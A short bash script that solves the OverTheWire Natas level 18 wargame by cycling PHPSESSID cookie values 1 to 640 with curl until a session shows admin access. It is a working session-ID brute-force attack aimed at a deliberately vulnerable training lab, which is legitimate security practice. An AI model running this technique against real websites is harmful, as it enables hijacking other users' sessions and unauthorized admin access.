#!/bin/bash

URL="http://natas18.natas.labs.overthewire.org/"
USER="natas18"
PASS="$1"

if [ -z "$PASS" ]; then
    echo "Usage: $0 <password>"
    exit 1
fi

for i in $(seq 1 640); do
    echo -ne "[*] Testing session $i/640\r"

    RESPONSE=$(curl -s -u "$USER:$PASS" --cookie "PHPSESSID=$i" "$URL")

    if echo "$RESPONSE" | grep -q "You are an admin"; then
        echo
        echo "[+] Found admin session: $i"
        echo "$RESPONSE"
        exit 0
    fi
done

echo
echo "[-] No admin session found"